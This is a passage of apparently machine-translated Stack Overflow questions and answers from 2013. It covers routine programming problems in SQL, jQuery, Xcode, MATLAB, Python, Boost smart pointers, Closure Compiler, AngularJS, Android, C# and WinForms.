> 时间：2013-04-24T06:00:44.573

您可以在查询中简单地使用“GROUP BY”，例如，

```
SELECT BrockerCode,
     MemberId,
     MIN(FY)
     MIN(SY)
     MIN(TY)
     FROM   @tablePromotee GROUP BY BrockerCode, MemberId 
```

sql server 上有多个聚合函数，您可以根据需要从中使用它们。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-24T05:55:48.710

试试这个——

```
SELECT 
      MemberId
    , BrockerCode
    , FY = MAX(FY)
    , SY = MAX(SY)
    , TY = MAX(TY)  
FROM (
    SELECT 
          BrockerCode
        , MemberId
        , RN = ROW_NUMBER()OVER(PARTITION BY MemberId ORDER BY MemberID)
        , FY = MIN(FY)OVER(PARTITION BY MemberId)
        , SY = MIN(SY)OVER(PARTITION BY MemberId)
        , TY = MIN(TY)OVER(PARTITION BY MemberId)
    FROM @tablePromotee 
)  
WHERE RN = 1
GROUP BY 
      BrokerCode
    , MemberId 
```

或者试试这个 -

```
SELECT TOP 1
      BrockerCode
    , MemberId
    , FY = MAX(MIN(FY)OVER(PARTITION BY MemberId))
    , SY = MAX(MIN(SY)OVER(PARTITION BY MemberId))
    , TY = MAX(MIN(TY)OVER(PARTITION BY MemberId))
FROM @tablePromotee 
GROUP BY 
      BrokerCode
    , MemberId
ORDER BY MemberId 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-24T05:55:59.420

尝试这个，

```
 SELECT BrockerCode,
          MemberId, FY,SUM(SY),SUM(TY) FROM @tablePromotee Group By BrockerCode,
          MemberId, FY 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-24T06:09:46.747

简单地使用 group by 是行不通的，因为您最终可能会得到 o.oo 值更改现有代码的最后一行，如下所示，希望您想要这个。

```
 SELECT MemberId,BrockerCode,FY,SY,TY  FROM  CTE  WHERE  RN = 1 and SY<>0
 ROUP BY BrockerCode, MemberId 
```

# jquery - BigVideo.js show image after video

> ID：16184296
> 
> 赞同：1
> 
> 时间：2013-04-24T05:49:57.320
> 
> 标签：jquery, plugins, jquery-plugins

I'm using BigVideo.js ([http://dfcb.github.io/BigVideo.js/](http://dfcb.github.io/BigVideo.js/)) for a background video. I've searched around and can't seem a way to have a poster image after the video has ended. Does anyone know a way to do this?

Ideally, I'd like to have it be transparent if thats at all possible since I already have a background image visible with the backstretch.js jQuery plugin.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T06:35:19.013

不确定这是否有效，但由于 bigvideo.js 使用[video.js](https://github.com/zencoder/video-js/blob/master/docs/api.md) api，您可以使用`ended`event 来检查视频播放是否已结束，并执行以下操作：

```
$(window).load(function(){
    _V_("your-video-element").ready(function(){
       this.addEvent("ended", function(){
          //show poster image 
          BV.show(poster_image_url); //BV is bigvideo object
       });
    });
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-08T17:29:27.560

What would the video element be using BigVideo.js? I have a site where clicking on a div plays the background video. So it's not calling a . There is no video element.

# xcode - 更新后的 XCode 4.6.2 问题。（错误：从不同分支构建的 PCH 文件）

> ID：16184304
> 
> 赞同：12
> 
> 时间：2013-04-24T05:50:38.290
> 
> 标签：xcode, xcode4.6

我的项目在以前版本的 Xcode 中运行良好。现在我已经更新到 Xcode 4.6.2，我收到了这个错误：

> 从不同于编译器 ((clang-425.0.28)) 的分支 ((clang-425.0.27)) 构建的 PCH 文件

这是 Xcode 中的错误吗？我如何解决它？

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2013-04-24T09:03:27.533

特别是如果您从命令行构建或者您有构建脚本，那么清理 xcode 目标是不够的。您必须删除此文件夹。

预编译的头文件位置可以在

```
Target -> build settings => "Build locations" -> Precompiled headers cached path 
```

打开`Terminal`，`cd`到文件夹路径并删除文件夹，

```
#rm -fr SharedPrecompiledHeaders 
```

![在此处输入图像描述](https://i.stack.imgur.com/abmUf.png)

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2013-04-24T06:30:17.833

完成我有`closed xcode project then started again`和`CMD+SHIFT+K`。这个逻辑对我来说很好用。

# matlab - 在 matlab GUI 中创建一组按钮

> ID：16184306
> 
> 赞同：1
> 
> 时间：2013-04-24T05:50:45.443
> 
> 标签：matlab, user-interface, matlab-guide

有没有办法制作一个对象数组（按钮、静态文本、字段等），其大小由用户在 matlab gui 中给出？

例如，用户在一个字段中键入 12，然后创建 12 个按钮。

PS mathworks.com 不允许我访问它的页面。一些幼稚的政治问题：&请在这里回答。谢谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-24T06:41:40.827

你可以尝试这样的事情：

```
N = input('How many buttons?   ');

hFig = figure;

hGroup = uibuttongroup('Units','Normalized','Position',[0 0 1 1]);

for i = 1:N
    hText(i) = uicontrol('Style','Text','String',['Variable' num2str(i)],...
        'Parent',hGroup,'Units','normalized','Position',[0 1-i/(N+1) 1/2 1/(N+1)],...
        'BackgroundColor','white');
    hInput(i) = uicontrol('Style','edit',...
        'Parent',hGroup,'Units','normalized','Position',[1/2 1-i/(N+1) 1/2 1/(N+1)],...
        'BackgroundColor','white');
end

hButton = uicontrol('Style','pushbutton','Parent',hGroup,'Units','normalized',...
    'String','Go!','Position',[0 0 1 1/(N+1)],'Callback',{}); 
```

当然，您可以随意调整位置等。您可以将`uibuttongroup`输入字段放在您希望出现的任何位置。

# python - Python - 'tuple' object does not support item assignment

> ID：16184315
> 
> 赞同：2
> 
> 时间：2013-04-24T05:51:17.697
> 
> 标签：python, tuples

Hi i am stuck on change value in tuple type. i know i cant change value in tuple type but is there a way to change it ???

```
a=[('z',1),('x',2),('r',4)]
for i in range(len(a)):
     a[i][1]=(a[i][1])/7  # i wanna do something like this !!! 
```

i wanna change the the number in a to be the probability eg:1/7, 2/7, 4/7 and is there a way to change the number of a to be a float ?? eg

```
a=[('z',0.143),('x',0.285),('r',0.571)] 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-24T05:52:48.837

最简单的可能是将元组变成列表：

```
a=[['z',1], ['x',2], ['r',4]] 
```

与元组不同，列表是可变的，因此您可以更改单个元素。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-24T05:53:40.250

改变`float`它很容易做到

```
from __future__ import division # unnecessary on Py 3 
```

一种选择：

```
>>> a=[('z',1),('x',2),('r',4)]
>>> a = [list(t) for t in a]
>>> for i in range(len(a)):
            a[i][1]=(a[i][1])/7

>>> a
[['z', 0.14285714285714285], ['x', 0.2857142857142857], ['r', 0.5714285714285714]] 
```

可能是最好的方法：

```
>>> a=[('z',1),('x',2),('r',4)]
>>> a[:] = [(x, y/7) for x, y in a]
>>> a
[('z', 0.14285714285714285), ('x', 0.2857142857142857), ('r', 0.5714285714285714)] 
```

*根据评论中的要求， “存储和不打印”*到小数点后 3 位

 *```
>>> import decimal
>>> decimal.getcontext().prec = 3
>>> [(x, decimal.Decimal(y) / 7) for x, y in a]
[('z', Decimal('0.143')), ('x', Decimal('0.286')), ('r', Decimal('0.571'))] 
```*

# boost - 提升 shared_ptr 循环参考？

> ID：16184316
> 
> 赞同：3
> 
> 时间：2013-04-24T05:51:22.947
> 
> 标签：boost, shared-ptr, smart-pointers, cycle, weak-ptr

来自 boost::shared_ptr 的 boost 文档：

> 因为实现使用引用计数，shared_ptr 实例的循环不会被回收。例如，如果 main() 持有一个 shared_ptr 给 A，它直接或间接持有一个 shared_ptr 回 A，A 的使用计数将为 2。原始 shared_ptr 的破坏将使 A 悬空，使用计数为 1。使用 weak_ptr 来“打破循环。”

我无法理解这一段，您能否提供这种情况的最小示例并解释后果。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-24T06:45:10.407

智能指针是如何工作的？他们记住`count`指向对象的智能指针，并`count`在新的共享指针控制对象时增加它，并`count`在共享指针失去对对象的控制时减少它。

假设你有一个类：

```
class A{
public:
    A(){std::cout << "Object created" << std::endl;}
    ~A(){std::cout << "Object destroyed" << std::endl;}
    void setSibling(boost::shared_ptr<A> &sibling){
        m_sibling = sibling;
    }
private:
    boots::shared_ptr<A> m_sibling;    
}; 
```

和一个 foo()：

```
void foo(){
    //count increases from 0 to 1 (ptr take control on instance of A)
    boost::shared_ptr<A> ptr(new A); 

    //count increases from 1 to 2 (m_sibling take control on instanse of A)
    ptr->setSibling(ptr); 

    //count decreases from 2 to 1 
    //(ptr is destroyed and lose control on instance of A)
    return; 
} 
```

当调用 ~A() 时 m_sibling 将失去控制，但只有当所有共享指针都失去控制时才会调用 ~A()。因此，在调用 foo 之后，您无法访问 A 的该实例。但是计数为 1，并且共享指针不会删除该对象，因此存在内存和资源泄漏。

请参阅 in boost 的文档`weak_ptr`以了解如何将它们与`shared_ptr`.

简而言之：弱指针就像共享指针但不增加`count`. 如果你有一个从`shared_ptr`被销毁对象创建的weak_ptr 实例，如果你尝试访问原始指针，weak_prt 实例将抛出异常（不会发生段错误）。boost 文档中有一个示例如何`weak_prt`正确使用 using`weak_ptr::lock()`方法。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-24T09:24:03.117

想象一个宝藏。
你的朋友拿了一个箱子，往里面放了一些金子。他还制作了一张地图。
这是一张神奇的地图，有一个条款：如果你烧掉最新的地图，宝藏和黄金都没有了。
你的朋友把地图放在金子正上方的箱子里，为你制作第二张地图，然后用里面的第一张地图关闭箱子。
他给了你第二张地图，然后带着宝藏消失了。
问题是：如果你烧掉你的地图会发生什么？
答案：没什么，宝物还在某处。

为什么？因为最新的地图副本还在宝箱里！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-24T06:44:11.373

这是一个示例（请注意，`~A`此处从未调用过）：

```
#include <boost/shared_ptr.hpp>
#include <iostream>

using boost::shared_ptr;
struct A
{
    ~A()
    {
        std::cout << "~A()" << std::endl;
    }
    void set_shared_ptr(const shared_ptr<A> &p)
    {
        p_ = p;
    }
    shared_ptr<A> p_;
};

int main()
{
  shared_ptr<A> q(new A);
  q->set_shared_ptr(q);
  q.reset();
} 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2016-12-27T03:02:18.363

来自[Boost 文档](http://www.boost.org/doc/libs/1_57_0/libs/smart_ptr/shared_ptr.htm)

> 因为实现使用引用计数，shared_ptr 实例的循环不会被回收。

你写：

> 我无法理解这一段

那挺好的; 那是因为你很聪明。这一段毫无意义。如果你认为你明白了，那就意味着你没有。

循环不能被回收，好吧，**因为存在循环依赖！**在回收循环的其余部分之前，不能回收循环的任何部分，因此您必须在销毁开始之前销毁每个对象。如果你有循环依赖，这是你程序设计失败的一部分。不要试图责怪智能指针（或引用计数）。

基本依赖问题的任何部分都与智能指针的实现细节没有任何关系；*它是由**拥有**智能指针*的定义引起的：在（最后一个）拥有指针的析构函数开始运行之前，拥有的对象不会被销毁。

当然，独占所有权智能指针也是如此，`std::unique_ptr`它甚至没有引用计数！

> 使用weak_ptr 来“打破循环”。

不。避免循环。你不能“打破”一个循环。没有所谓的“打破”循环。

Boost 的文档在这里比没用还糟糕。这很危险。它在这样一个级别上混合了不变量和实现，它表明对智能指针语义的理解非常糟糕。

它讲述了很多关于虚假信息和反模式自我复制的能力！

# javascript - Type checking with closure compiler not implicitly on?

> ID：16184322
> 
> 赞同：5
> 
> 时间：2013-04-24T05:51:52.347
> 
> 标签：javascript, google-closure-compiler, strong-typing

I am compiling files and get working compiled code but the annotations seem to be completely ignored; no warnings no errors. Using calcdeps.py to compile my code with the following command:

```
set calc="D:\software\closure compiler\library\closure\bin\calcdeps.py"
c:\Python27\python.exe %calc% ^
--path D:\flex_sdk_4.6\projects\EnglishConverter\bin\js\ ^
--input D:\flex_sdk_4.6\projects\EnglishConverter\bin\js\mmt\Mediator.js ^
--input D:\flex_sdk_4.6\projects\EnglishConverter\bin\js\mmt\DomDependent.js ^
--input D:\flex_sdk_4.6\projects\EnglishConverter\bin\js\mmt\WorkFlow.js ^
--input D:\flex_sdk_4.6\projects\EnglishConverter\bin\js\mmt\Messenger.js ^
--input D:\flex_sdk_4.6\projects\EnglishConverter\bin\js\mmt\data.js ^
--compiler_jar "D:\software\closure compiler\compiler.jar" ^
--output_mode compiled ^
--compiler_flags="--compilation_level=ADVANCED_OPTIMIZATIONS" ^
--compiler_flags="--formatting=PRETTY_PRINT" ^
--output_file D:\flex_sdk_4.6\projects\EnglishConverter\bin\js\main.js
pause 
```

For example in Messenger.js I have a function:

```
/**
 * Replaces words in matches with a yes/no/all box
 * @param {Array} matches contains the items of myApp.data that matched words in text
 * @param {string} text contains the cleaned up user input (no html)
 */
myApp.Messenger.builtReplacewithOptions=function(matches,text){ 
```

The variable matches has to be an Array and all code calling this function call it with an Array. To test type checking I changed the Array to string like so:

```
 * @param {string} matches contains the items of myApp.data that matched words in text 
```

Compiled again but no warning or error is given. tried to add a parameter to the compiler in the batch file:

```
--compiler_flags="--jscomp_warning=checkTypes" ^ 
```

Now I get warnings. My question is: do I have to turn on all kinds of checking? Is there a way that all checks are on and I only explicitly turn off some?

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-24T05:58:07.053

您可以设置标志`--warning_level=VERBOSE`，相当于

```
--jscomp_warning=checkTypes --jscomp_error=checkVars \
--jscomp_warning=deprecated --jscomp_error=duplicate \
--jscomp_warning=globalThis --jscomp_warning=missingProperties \
--jscomp_warning=undefinedNames --jscomp_error=undefinedVars 
```

还有一些检查将被关闭，如果需要，您必须明确启用它们。默认情况下，afaik 无法启用*所有*功能。

有关警告/错误类型的完整列表，请参阅[https://code.google.com/p/closure-compiler/wiki/Warnings](https://code.google.com/p/closure-compiler/wiki/Warnings)。

# javascript - 如何在 JavaScript + Canvas 中对叠加对象进行分组？

> ID：16184328
> 
> 赞同：0
> 
> 时间：2013-04-24T05:52:27.277
> 
> 标签：javascript, jquery, html5-canvas

拜托，我需要一些帮助！好的，有带有画布的 HTML5 文档。Javascript 在画布上呈现地图。在地图上，有跟踪器可以显示城市中汽车的位置。每个跟踪器 - 它是带有文本标签的图标，包含数字。

可能会出现汽车彼此非常靠近的情况，在这种情况下，一个跟踪器的图标可能会过度标记另一个跟踪器。有重叠的图标是正常的，但标签应该始终可见。

我需要一个对重叠跟踪器的标签进行分组的算法。请帮忙！我什至不知道从哪里开始！

PS：这应该在没有任何第三方库的情况下完成，除了 jQuery 和 jQuery UI（客户的要求）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T07:25:02.417

从来没有这样做过，但这是我的想法：

假设您有一组这样的三辆汽车：

```
var cars=[{name:"car1",x:100,y:101},{name:"car2",x:99,y:101},{name:"car3",x:90,y:111}]; 
```

我将首先按位置对其进行排序：

```
cars.sort(sortfunction)

function sortfunction(a, b){
   return a.x - b.x + a.y - b.y
} 
```

然后，当您将汽车放在地图上时，请查看之前的位置。如果它在附近，请添加标签类：

```
var label=0;
for(var i=0; i<cars.length; i++) {
  if(i>=1) {
    if(Math.abs(cars[i-1].x-cars[i].x+cars[i-1].y-cars[i].y)<10) {
      //Add your element with a label class $("<div class='car label"+label+"' style='...'>")
       console.log(cars[i-1].name+" is to near to "+cars[i].name);
      label++;
    }
    else {
      //Add your element normal $("<div class='car' style='...'>")
       label=0;   
    }
  }
} 
```

您的标签类应定位标签元素：

```
.label0 {
    /* position north */
}
.label1 {
    /* position west*/
}
.label2 {
    /* position east*/
}
/* can go on with nw, ne, se and sw if needed*/ 
```

这是一个显示这种方法[的小提琴。](http://jsfiddle.net/yfaLr/2/)

# angularjs - Replace content of comment-directive

> ID：16184331
> 
> 赞同：0
> 
> 时间：2013-04-24T05:52:46.170
> 
> 标签：angularjs, angularjs-directive

I'm stuck with dynamic template for a directive. Mainly, the directive that called as a comment.

For example, I have created a directive that should check the type of element and an appropriate template. In the link-function I check attribute type of element in the scope and select required template.

All works fine if I call directive as an attribute or an element. However, if I call it as a comment then nothing happens, the output is empty.

Here the code of that directive:

```
app.directive('inQux', function ($compile) {
    var template, inQux, linker;

    template = {
        foo: '<div>I\'m foo. {{item.value}}</div>',
        bar: '<div>I\'m bar. {{item.value}}</div>'
    };

    linker = function ($scope, element, attrs) {
        var content = $compile(template[$scope.item.type])($scope);

        element.append(content);
    };

    inQux = {
        restrict: 'AME',
        replace: true,
        link: linker
    };

    return inQux;
}); 
```

You can find full example by following [the link](http://jsfiddle.net/VanSanblch/Qsf92/ "the link")

So, my question is there a way to replace content for comment-directive?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T15:15:20.063

如果指令作为注释，您似乎不能在指令的链接函数中使用 element.append() 。但解释很简单：无法将元素附加到注释节点。

如果您使用另一种方法（将模板直接绑定到您的指令），如下所示：

```
app.directive('inQux', function ($compile) {
    var inQux;

    inQux = {
        template: '<div>I\'m {{item.type}}. {{item.value}}</div>',
        restrict: 'AME',
        replace: true
    };

    return inQux;
}); 
```

...就像在这个[jsfiddle](http://jsfiddle.net/lutze/Qsf92/3/ "jsfiddle")中一样，它可以工作。作为额外的优势，指令的代码现在要小得多......但我不知道你想在你的原始应用程序中实现什么。

# javascript - 已定义变量返回未定义

> ID：16184343
> 
> 赞同：0
> 
> 时间：2013-04-24T05:54:10.523
> 
> 标签：javascript, jquery

我有以下代码，但是当我运行代码时，它返回未定义。我不知道为什么会这样！

```
function loadServiceXml(){
    $.get("/xml/ServiceUrls.xml", function(xml){
        return $.xml2json(xml);
    });
}

function getMajorGroups(){
    //get the base element to be created.
    var jsonXmlObject;
    jsonXmlObject = loadServiceXml();
    var element = $('.item-group-button').first();

} 
```

响应返回没有任何问题的 xml 文件，当我使用 firebug 中断并检查变量的值时，它返回为未定义。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T05:58:25.927

`$.get`是一个异步操作。所以实际发生的是您的`loadServiceXml()`方法返回`undefined`，因为它没有显式返回任何内容。您必须在传递给的函数内完成您打算做的工作`$.get`

```
function loadServiceXml(){
    $.get("/xml/ServiceUrls.xml", function(xml){
        // Process the response here
    });
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-24T06:01:32.957

`return`from 您的回调`$.get`不会返回值 out of `loadServiceXml`。该函数永远不会返回任何东西！此外，您有一个异步调用，您试图将其视为同步调用。

相反，尝试将回调函数传递给 loadServiceXml，以便在返回值后使用返回值调用：

```
function loadServiceXml(callback){
    $.get("/xml/ServiceUrls.xml", function(xml){
        callback($.xml2json(xml));
    });
}

function getMajorGroups(){
    //get the base element to be created.
    loadServiceXml(function(jsonXmlObject) {
        var element = $('.item-group-button').first();
    }));
} 
```

在这里，您将一个匿名函数传递给`loadServiceXml`，然后在对象可用时调用该函数并将 XML 对象作为参数传递。因此，一旦您的调用完成，执行就会跳回到`getMajorGroups`.

# android - 添加到地图后无法修改圆圈

> ID：16184344
> 
> 赞同：0
> 
> 时间：2013-04-24T05:54:10.140
> 
> 标签：android

我在地图上添加了一个圆圈。删除圆圈的方法被称为一个单独的线程，这是我迄今为止尝试过的。我已经尝试了很多其他方法，但没有任何乐趣可以修改它。

```
Circle myCircle;

    final Handler handler = new Handler();
        final Runnable r = new Runnable()
        {
            public void run() 
            {   
            handler.postDelayed(this, 1000);
                removeCircle();
            }
        };
        handler.postDelayed(r, 0);

public void removeCircle(){

    Activity activity = (Activity) context;
    activity.runOnUiThread(new Runnable() {
        public void run() {
            myCircle.remove();
        }
    });

} 
```

# c# - 使用凭据提供程序自定义 Windows 7 登录

> ID：16184350
> 
> 赞同：0
> 
> 时间：2013-04-24T05:54:30.860
> 
> 标签：c#, api, authentication, windows-7

通常，Windows 7 使用用户名和密码对用户进行身份验证。我需要自定义此功能。我想编写一个 Windows 服务，允许某些外部设备或身份验证提供程序将用户登录到 Windows。例如，指纹阅读器可以通过指纹而不是密码将用户登录到 Windows。

所以我正在尝试为此目的找到一个 C# API（例如`GINA.DLL`）。

谁能指出我需要什么以及我应该从哪里开始研究如何制作这样一个东西的正确方向？

**更新：** 我已经通过以下链接。[http://msdn.microsoft.com/en-us/magazine/cc163489.aspx](http://msdn.microsoft.com/en-us/magazine/cc163489.aspx)。它包含信息。但是示例是在 C++ 中的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T06:07:54.413

> 我正在尝试为此目的找到一个 C# API

[不要在核心操作系统进程中使用高级语言、库、框架、虚拟机或运行时](http://support.microsoft.com/default.aspx?scid=kb;en-us;841927&Product=NETFrame)。

# node.js - 这是 node.js 收到音频流数据时的数据日志

> ID：16184358
> 
> 赞同：0
> 
> 时间：2013-04-24T05:54:57.840
> 
> 标签：node.js, audio, streaming

这是 node.js 收到音频流数据时的数据日志

你是什​​么意思？

```
<Buffer f9 ff 0d 00 0b 00 eb ff cc ff c8 ff d6 ff ee ff f6 ff f9 ff f4 ff f2 ff ff ff fe ff 10 00 1b 00 15 00 14 00 16 00 0d 00 18 00 1f 00 36 00 36 00 29 00 16 ...>
<Buffer f2 ff e4 ff e2 ff e1 ff d9 ff e7 ff d5 ff eb ff e2 ff e0 ff d3 ff cc ff c5 ff db ff fd ff 06 00 fa ff dc ff c5 ff c5 ff d0 ff da ff e2 ff ea ff e4 ff c6 ...>
<Buffer 0e 00 18 00 08 00 e4 ff f2 ff ee ff fd ff 06 00 12 00 11 00 19 00 0e 00 1a 00 02 00 04 00 05 00 03 00 07 00 0a 00 22 00 06 00 01 00 f4 ff dc ff dd ff f7 ...>
<Buffer 28 00 1b 00 0e 00 0b 00 f1 ff f5 ff 03 00 f5 ff f9 ff f2 ff f0 ff ea ff fb ff fa ff 0a 00 08 00 15 00 12 00 f8 ff f8 ff fe ff fd ff fb ff 0f 00 0e 00 ff ...> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T05:57:36.110

缓冲区是节点对原始二进制数据的表示。所以你看到的是截断的 console.log 十六进制数据版本。

见[http://nodejs.org/api/buffer.html](http://nodejs.org/api/buffer.html)

# xcode - 在 xcode 中预选 UIPickerView

> ID：16184363
> 
> 赞同：0
> 
> 时间：2013-04-24T05:55:39.403
> 
> 标签：xcode, select, uipickerview

我有一个由 for 循环创建的 UIPickerView。我将如何预先选择一个选项？

```
arrayColour = [[NSMutableArray alloc] init];

    for (int i = 0; i < [substrings count]; i++)
    {
        //parse out each option (i)
        NSString* companyoption = [substrings objectAtIndex:i];
        //add as option to component
        [arrayColour addObject:companyoption];
    } 
```

假设我有一个名为 StoredPicker 的变量，它具有他们之前选择的选项的值，我想在他们返回此视图时重新选择该选项。

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-24T05:59:01.120

使用这行代码并放置您的值，通过使用这种方法您可以实现这一点，

```
- (void)selectRow:(NSInteger)row inComponent:(NSInteger)component animated:(BOOL)animated; 
```

前任：- `[pickerView selectRow:n inComponent:0 animated:YES];`

编辑： - 所以尝试像这样将数组对象值保存在字符串中，并使用下面的代码找出数组位置并传递这个整数值。

```
NSUInteger currentIndex = [itemArray indexOfObject:@"itemName"]; 
```

# jquery - jquery change multiple IDs with regular expression

> ID：16184369
> 
> 赞同：2
> 
> 时间：2013-04-24T05:55:53.120
> 
> 标签：jquery, regex, dynamic, replace

i need to modify multiple IDs, classes and names of a div, span, select and other elements.

i clone the html from the last row i have in a table, like

```
var num     = $('.clonedLighting').length; // num of current rows
var newNum  = new Number(num + 1);      // the numeric ID of the new input field being added

// create the new element via clone(), and manipulate it's ID using newNum value
var newElem = $('#inputlighting' + num).clone().prop('id', 'inputlighting' + newNum); 
```

Then in the next step i modify the cloned IDs like

```
newElem.children('td').children('label.prod_item').prop('for', 'appliancetextfield' + newNum);
newElem.children('td').children('select.prod_item').prop('id', 'appliancetextfield' + newNum).prop('name', 'appliancetextfield' + newNum).prop('value', ''); 
```

which is working OK. however, the appliancetextfield sections now has many more elements. I would like to replace all names, classes and IDs that contain

```
'appliancetextfield'+num 
```

with

```
'appliancetextfield'+newNum 
```

instead of doing it for every element. is this possible? how?

to clarify: the IDs, classes or names would look like

```
appliancetextfield4
appliancetextfield4_title
appliancetextfield4_titleText
appliancetextfield4_msdd 
```

and should turn into

```
appliancetextfield5
appliancetextfield5_title
appliancetextfield5_titleText
appliancetextfield5_msdd 
```

at this point it looks like the number will only ever be single digit, but one day may have to go up to 10 or higher. Thanks for any input.

EDIT: Trying to implement the below suggestions and lots of googling: I now have:

```
var num     = $('.clonedLighting').length; // current rows
var newNum  = new Number(num + 1); 

$('#inputlighting' + num).clone().prop('id', function(index, id) {
    return id.replace(/(appliance.*)\d\d?(.*)/g, "$1" + newNum + "$2");
}).insertAfter($('#inputlighting' + num)); 
```

it looks like the right track but the regular expression and/or the back-referencing doesn't work.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T14:57:46.240

我想我明白了：

```
 //newElem is the newly cloned object
    newElem.find('[id^=appliance]').prop('id', function(index, id) {
            return id.replace(/(appliance.*)\d\d?(.*)/g,"$1" +newNum+ "$2");
    });
    newElem.find('[for^=appliance]').prop('for', function(index, id) {
            return id.replace(/(appliance.*)\d\d?(.*)/g,"$1" +newNum+ "$2");
    });
    newElem.find('[name^=appliance]').prop('name', function(index, id) {
            return id.replace(/(appliance.*)\d\d?(.*)/g,"$1" +newNum+ "$2");
    }); 
```

感谢您的帮助。

# c# - 如何计算一条新闻的评论数？

> ID：16184371
> 
> 赞同：1
> 
> 时间：2013-04-24T05:55:58.653
> 
> 标签：c#, asp.net

我在数据库中有一个表：`TBL_New`s 和另一个：`TBL_Comments` 现在我可以显示新闻和评论，但我想在一个 gridview 中显示每个新闻的计数。我在页面上有一个显示最新消息（新闻标题）的网格视图，我想像这样显示它们：

```
grdNews.DataSource = 
    (from n in context.TBL_News
    join nc n context.TBL_Categories on p.CategoryID equals nc.CategoryID 
    select new {n.NewsID, n.NewsTitle,nc.CategoryTitle});

grdNews.DataBind(); 
```

我的第一条新闻 - 发表于：体育新闻，作者：管理员，评论：25

这 25 条是这条新闻的数量。

如何获得每条新闻的评论数？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-24T06:57:56.577

我知道了！

只需在此查询中使用另一个选择查询：

```
grdNews.DataSource = 
(from n in context.TBL_News 
join nc n context.TBL_Categories on p.CategoryID equals nc.CategoryID
 select new 
{n.NewsID,
 n.NewsTitle,
 nc.CategoryTitle,
 CommentsCount = 
 (from c in context.TBL_Comments where c.NewsID == n.NewsID select c).Count()
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-24T06:57:05.230

如果它们通过 NewsID 关联在一起，您可以在从 TBL_News 加载的 NEWS 时过滤 TBL_Comments。拥有一个 DataModel 并通过说 LINQ 来管理一切更容易。

# c# - C# 内部如何执行 ModelState.IsValid？

> ID：16184373
> 
> 赞同：2
> 
> 时间：2013-04-24T05:56:01.640
> 
> 标签：c#, asp.net-mvc-3

```
 [HttpPost]
        public ActionResult Create(ALLOCATION_M allocationM)
        {
            try
            {
                if (ModelState.IsValid)
                {
                    allocationM.ALLO_ID = GetId();
                    _unitOfWork.AllocationMRepository.Insert(allocationM);
                    _unitOfWork.Save();
                    return RedirectToAction("Index");
                }
            }
            catch (DataException)
            {
                ModelState.AddModelError("", EditorLocalization.AllocationMasterController_Create_Unable_to_save_changes__Try_again__and_if_the_problem_persists__see_your_system_administrator_);
            }

            return View(allocationM);
        } 
```

C# 运行时内部如何检查`ModelState.IsValid`？我的意思是当从视图调用 post 方法时，它如何检查我的模型状态是有效还是无效。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-24T05:59:32.330

当默认模型绑定器尝试从请求值实例化作为参数传递给控制器​​操作（在执行此操作之前）的模型时，如果存在一些验证错误，它会将它们添加到 ModelState。因此，一旦执行流程进入您的控制器操作，就已经添加了验证错误。IsValid 属性只是检查 Errors 集合中是否有元素。

例如，假设您`ALLOCATION_M`有一个用属性装饰的`[Required]`属性：

```
[Required]
public string SomeProperty { get; set; } 
```

当您提交表单以调用此控制器操作时，如果`SomeProperty`请求中没有调用参数或者如果它为空，则默认模型绑定器将添加与此属性关联的验证错误。

# c# - How could I control location of external form relative to a pictureBox on another form?

> ID：16184379
> 
> 赞同：1
> 
> 时间：2013-04-24T05:56:28.703
> 
> 标签：c#, .net, winforms, position, point

I'm developing a windows application that is image viewer. This program contain main form to load picture and another form to load swf file into it dynamically .
work of my application is like this : when mouse clicked on pictureBox on main form an object will be created (type of second form) and should locate in correct position.

I have problem to get correct position. How could do this ?
Thanks for your help

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-24T06:06:05.253

窗体上子控件的位置以*子坐标*给出。换句话说，在相对于父窗体的坐标中。

表单的位置以*屏幕坐标*给出，因为它们的父级是整个屏幕。

这在文档中针对`Location`属性的不同重载进行了说明。

> **[`Control.Location`](http://msdn.microsoft.com/en-us/library/system.windows.forms.control.location.aspx):**获取或设置控件左上角相对于其容器左上角的坐标。
> 
> **[`Form.Location`](http://msdn.microsoft.com/en-us/library/ms159414.aspx):**获取或设置代表窗体左上角屏幕坐标的Point。

所以你需要将Form A上PictureBox的位置从子坐标转换为屏幕坐标，然后你可以使用这些屏幕坐标来设置Form B的位置。

要在 WinForms 中执行此操作，请调用以下[`Control.PointToScreen`](http://msdn.microsoft.com/en-us/library/system.windows.forms.control.pointtoscreen.aspx)方法：

```
Point childCoords  = myPictureBox.Location;
Point screenCoords = myPictureBox.PointToScreen(childCoords);

myOtherForm.Location = screenCoords; 
```

# performance - 代码分析器如何不正确

> ID：16184385
> 
> 赞同：1
> 
> 时间：2013-04-24T05:56:50.703
> 
> 标签：performance, optimization, profiling

我已经阅读并体验过性能分析器有时是不正确的。有时它们会为某些函数生成不正确的运行时间，并显示实际上并不存在的调用图。我想知道这些错误通常是如何发生的，这些错误的主要原因是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T13:12:59.523

